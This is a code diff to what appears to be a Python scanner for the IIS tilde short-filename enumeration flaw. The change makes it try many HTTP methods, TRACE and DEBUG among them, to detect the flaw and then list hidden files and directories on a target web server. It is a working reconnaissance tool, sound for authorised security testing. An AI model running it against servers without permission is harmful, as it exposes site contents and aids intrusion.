@@ -29,6 +29,8 @@ from time import sleep
 # In the 'headers' below, change the data that you want sent to the remote server
 # This is an IE10 user agent
 headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)'}
+methods = ["OPTIONS","GET","POST","HEAD","TRACE","TRACK","DEBUG"]
+tails = ["\\a.asp","/a.asp","\\a.aspx","/a.aspx","/a.shtml","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","","/a.xxx"]
 
 # Targets is the list of files from the scanner output
 targets = []
@@ -55,6 +57,8 @@ response_code = {}
 
 # Environment logs
 counter_requests = 0
+using_method = "GET"
+using_tail = "*~1*/.aspx"
 
 # Terminal handler for Windows
 if os.name == "nt":
@@ -89,9 +93,12 @@ def printResult(msg, color='', level=1):
             f.write(msg + '\n')
             f.close()
 
-def getWebServerResponse(url):
+def getWebServerResponse(url, method=False):
     # This function takes in a URL and outputs the HTTP response code and content length (or error)
-    global counter_requests
+    global counter_requests, using_method
+    
+    method = method if method is not False else using_method
+    
     try:
         if args.verbose_level:
             sys.stdout.write("[*]  Testing: %s \t\t\r" % url)
@@ -100,6 +107,7 @@ def getWebServerResponse(url):
         
         counter_requests += 1
         req = urllib2.Request(url, None, headers)
+        req.get_method = lambda: method
         response = urllib2.urlopen(req)
         return response
     except urllib2.HTTPError as e:
@@ -195,7 +203,9 @@ def initialCheckUrl(url):
     else:
         return response_code
 
-def checkVulnerableString(url):
+def checkVulnerable(url):
+    global methods, using_method
+
     # Set the default string to be IIS6.x
     check_string = '*~1*/.aspx' if args.limit_extension is None else '*~1'+args.limit_extension+'/.aspx'
 
@@ -220,15 +230,22 @@ def checkVulnerableString(url):
         printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)
 
     # Check to see if the server is vulnerable to the tilde vulnerability
-    resp1 = getWebServerResponse(args.url + '~1*/.aspx')
-    resp2 = getWebServerResponse(args.url + '*~1*/.aspx')
-    if resp1.code != resp2.code:
-        printResult('[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..', bcolors.YELLOW)
-    else:
+    isVulnerable = False
+    for m in methods:
+        resp1 = getWebServerResponse(args.url + '~1*/.aspx', method=m)
+        resp2 = getWebServerResponse(args.url + '*~1*/.aspx', method=m)
+        if resp1.code != resp2.code:
+            printResult('[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..', bcolors.YELLOW)
+            printResult('[+]  Using HTTP METHOD: %s' % m, bcolors.GREEN)
+            isVulnerable = True
+            using_method = m
+            break
+
+    if isVulnerable == False:
         printResult('[!]  Error. Server is probably NOT vulnerable or given path is wrong.', bcolors.RED)
         printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script.', bcolors.RED)
         sys.exit()
-
+        
     return check_string
 
 def addNewFindings(findings=[]):
@@ -266,7 +283,7 @@ def findExtensions(url, filename):
     if not args.limit_extension and confirmDirectory(url, filename):
         notFound = False
         addNewFindings([filename+'/'])
-        printResult('[+]  Found directory:  ' +filename+'/', bcolors.YELLOW)
+        printResult('[+]  Enumerated directory:  ' +filename+'/', bcolors.YELLOW)
 
     if notFound:
         printResult('[!]  Something is wrong:  %s%s/ should be a directory, but the response is strange.'%(url,filename), bcolors.RED)
@@ -275,7 +292,7 @@ def findExtensions(url, filename):
         while possible_exts:
             item = possible_exts.pop()
             if not any(map(lambda s:s.endswith(item), possible_exts)):
-                printResult('[+]  Found file:  ' +filename+'.'+item, bcolors.YELLOW)
+                printResult('[+]  Enumerated file:  ' +filename+'.'+item, bcolors.YELLOW)
                 found_files.append(filename+'.'+item)
         addNewFindings(found_files)
     return
@@ -348,7 +365,7 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
 
 def confirmUrlExist(url, isFile=True):
     # Check if the given url is existed or not there
-    resp = getWebServerResponse(url)
+    resp = getWebServerResponse(url, method="GET")
     if resp.code != response_code['not_there_code']:
         size = len(resp.read())
         if response_code['not_there_code'] == 404:
@@ -499,7 +516,7 @@ def main():
         printResult('[+]  HTTP Response Codes: %s' % response_code, bcolors.PURPLE, 2)
 
         # Check to see if the remote server is IIS and vulnerable to the Tilde issue
-        check_string = checkVulnerableString(args.url)
+        check_string = checkVulnerable(args.url)
 
         # Break apart the url
         url = urlparse(args.url)
@@ -512,13 +529,6 @@ def main():
         
     except KeyboardInterrupt:
         sys.exit()
-        
-#### Test ####
-##    addNewFindings(["descri~1.htm","testte~1.htm","s-t-o-~1.asp","indexc~1.asp"])
-##    wordlistEnum(url_ok)
-##    printFindings()
-##    return
-#### Test ####
         
     try:
         # Do the initial search for files in the root of the web server
